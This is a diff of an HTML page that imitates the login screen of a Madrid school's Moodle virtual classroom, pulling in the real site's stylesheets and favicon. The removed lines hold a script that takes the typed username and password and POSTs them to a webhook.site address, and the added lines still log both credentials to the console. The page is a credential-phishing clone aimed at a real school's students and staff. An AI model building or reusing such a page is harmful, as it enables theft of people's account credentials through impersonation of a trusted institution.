@@ -2,10 +2,11 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Entrar al sitio | AulaVirtual</title>
-  <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/styles.php/educamadrid/1743813109_1741762448/all">
-  <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/yui_combo.php?3.18.1/cssreset/cssreset-min.css&amp;3.18.1/cssfonts/cssfonts-min.css&amp;3.18.1/cssgrids/cssgrids-min.css&amp;3.18.1/cssbase/cssbase-min.css">
-  <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/yui_combo.php?rollup/3.18.1/yui-moodlesimple-min.css">
+  <link rel="stylesheet" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/styles.php/educamadrid/1743813109_1741762448/all">
+  <link rel="stylesheet" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/yui_combo.php?3.18.1/cssreset/cssreset-min.css&3.18.1/cssfonts/cssfonts-min.css&3.18.1/cssgrids/cssgrids-min.css&3.18.1/cssbase/cssbase-min.css">
+  <link rel="stylesheet" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/yui_combo.php?rollup/3.18.1/yui-moodlesimple-min.css">
   <link rel="shortcut icon" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/image.php/educamadrid/theme/1743813109/favicon">
   <style>
     body {
@@ -16,14 +17,19 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      padding: 10px;
     }
+
     .login-container {
       background-color: white;
-      padding: 40px;
+      padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
       text-align: center;
+      width: 100%;
+      max-width: 400px;
     }
+
     .logo {
       display: flex;
       justify-content: center;
@@ -31,9 +37,11 @@
       margin-bottom: 20px;
       gap: 10px;
     }
+
     .logo img {
       height: 40px;
     }
+
     .login-container input {
       width: 100%;
       padding: 12px;
@@ -41,10 +49,13 @@
       border-radius: 6px;
       border: 1px solid #ccc;
       font-size: 16px;
+      box-sizing: border-box;
     }
+
     .password-container {
       position: relative;
     }
+
     .toggle-password {
       position: absolute;
       right: 10px;
@@ -53,33 +64,39 @@
       background: none;
       border: none;
       cursor: pointer;
+      padding: 0;
     }
-    .login-button {
+
+    .login-button, .guest-button {
       width: 100%;
-      background-color: #0e67c1;
-      color: white;
-      border: none;
-      padding: 12px;
-      font-size: 18px;
-      border-radius: 6px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-    .guest-button {
-      width: 100%;
-      background-color: #d3d7dc;
-      color: #333;
-      border: none;
       padding: 12px;
       font-size: 16px;
       border-radius: 6px;
-      margin-top: 15px;
+      border: none;
       cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-button {
+      background-color: #0e67c1;
+      color: white;
+    }
+
+    .guest-button {
+      background-color: #d3d7dc;
+      color: #333;
+    }
+
+    /* Opcional: Estilos extra para pantallas pequeñas */
+    @media (max-width: 400px) {
+      .login-container {
+        padding: 15px;
+      }
     }
   </style>
 </head>
 <body>
-  
+
   <div class="login-container">
     <div class="logo">
       <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcolegiopiobaroja.es%2Fwp-content%2Fuploads%2F2019%2F12%2Flogo-aula-virtual.png&f=1&nofb=1&ipt=f9c9a35db7a0fc65cae0a2fe7719c879b9c574499d5ef01f1bbabaf00e91e604" alt="Logo Comunidad de Madrid">
@@ -88,12 +105,17 @@
     <div class="password-container">
       <input type="password" id="mensajeInput" placeholder="Contraseña">
       <button class="toggle-password">
-        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstatic.vecteezy.com%2Fsystem%2Fresources%2Fpreviews%2F048%2F839%2F086%2Foriginal%2Feye-silhouette-icon-icons-used-for-password-and-ophthalmology-vector.jpg&f=1&nofb=1&ipt=37e81ac21f5fb1750652ca2d3de8c0e3780a6dd40ccc9add8342107ffa608fd1" alt="Ver contraseña" height="20" style="right: 0px; position: absolute; top: -10px;">
+        <img src="https://static.vecteezy.com/system/resources/previews/048/839/086/original/eye-silhouette-icon-icons-used-for-password-and-ophthalmology-vector.jpg" alt="Ver contraseña" height="20">
       </button>
     </div>
-    <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php"><button id="btnEnviar" class="login-button">Acceder</button></a>
-    <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/idex.php?loginredirect=1"><button class="guest-button">Entrar como persona invitada</button></a>
+    <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php">
+      <button id="btnEnviar" class="login-button">Acceder</button>
+    </a>
+    <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/idex.php?loginredirect=1">
+      <button class="guest-button">Entrar como persona invitada</button>
+    </a>
   </div>
+
   <script>
     const nombreInput = document.getElementById('nombreInput');
     const mensajeInput = document.getElementById('mensajeInput');
@@ -103,33 +125,15 @@
       const nombre = nombreInput.value.trim();
       const mensaje = mensajeInput.value.trim();
 
-      console.log("Nombre:", nombre);
-      console.log("Mensaje:", mensaje);
-
       if (!nombre || !mensaje) {
-        console.warn("Falta completar uno de los campos.");
+        alert("Por favor completa ambos campos.");
         return;
       }
 
-      const cuerpo = `Usuario: ${nombre}\nContraseña: ${mensaje}`;
-
-      fetch('https://webhook.site/e11574cb-2cce-4924-8cc6-5d079eda2f1b', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'text/plain'
-        },
-        body: cuerpo
-      })
-      .then(res => {
-        console.log("Petición enviada. Status:", res.status);
-    
-        nombreInput.value = '';
-        mensajeInput.value = '';
-      })
-      .catch(err => {
-        console.error("Error al enviar:", err);
-      });
+      // Aquí normalmente enviarías datos o redirigirías al login real
+      console.log("Usuario:", nombre, "Contraseña:", mensaje);
     });
   </script>
+
 </body>
 </html>
